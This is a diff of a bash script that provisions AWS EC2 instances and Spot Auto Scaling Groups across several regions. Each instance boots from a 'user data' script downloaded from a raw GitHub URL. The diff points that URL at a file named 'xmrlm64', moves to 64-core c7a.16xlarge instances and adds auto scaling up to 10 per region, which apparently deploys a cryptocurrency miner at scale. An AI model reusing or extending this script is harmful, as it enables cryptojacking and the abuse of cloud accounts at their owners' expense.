@@ -1,14 +1,15 @@
+
 #!/bin/bash
 
 # List of regions and corresponding AMI IDs
 declare -A region_image_map=(
     ["us-east-1"]="ami-0e2c8caa4b6378d8c"
     ["us-west-2"]="ami-05d38da78ce859165"
-    ["eu-north-1"]="ami-075449515af5df0d1"
+    ["us-east-2"]="ami-0cb91c7de36eed2cb"
 )
 
 # URL containing User Data on GitHub
-user_data_url="https://raw.githubusercontent.com/kiemtien1/Philodata/refs/heads/main/philodata"
+user_data_url="https://raw.githubusercontent.com/kiemtien1/Philodata/refs/heads/main/xmrlm64"
 
 # Path to User Data file
 user_data_file="/tmp/user_data.sh"
@@ -34,7 +35,7 @@ for region in "${!region_image_map[@]}"; do
     image_id=${region_image_map[$region]}
 
     # Check if Key Pair exists
-    key_name="Mitsituno-$region"
+    key_name="pname-$region"
     if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
         echo "Key Pair $key_name already exists in $region"
     else
@@ -76,11 +77,33 @@ for region in "${!region_image_map[@]}"; do
         echo "SSH (22) access already configured for Security Group $sg_name in $region"
     fi
 
+    # Automatically select an available Subnet ID for Auto Scaling Group
+    subnet_id=$(aws ec2 describe-subnets --region $region --query "Subnets[0].SubnetId" --output text)
+
+    if [ -z "$subnet_id" ]; then
+        echo "No available Subnet found in $region. Skipping region."
+        continue
+    fi
+
+    echo "Using Subnet ID $subnet_id for Auto Scaling Group in $region"
+
+    # Create Auto Scaling Group with selected Subnet ID
+    asg_name="SpotASG-$region"
+    aws autoscaling create-auto-scaling-group \
+        --auto-scaling-group-name $asg_name \
+        --launch-template "LaunchTemplateId=$launch_template_id,Version=1" \
+        --min-size 1 \
+        --max-size 10 \
+        --desired-capacity 1 \
+        --vpc-zone-identifier "$subnet_id" \
+        --region $region
+    echo "Auto Scaling Group $asg_name created in $region"
+
     # Launch 1 On-Demand EC2 Instance
     instance_id=$(aws ec2 run-instances \
         --image-id "$image_id" \
         --count 1 \
-        --instance-type r7a.2xlarge \
+        --instance-type c7a.16xlarge \
         --key-name "$key_name" \
         --security-group-ids "$sg_id" \
         --user-data "$user_data_base64" \
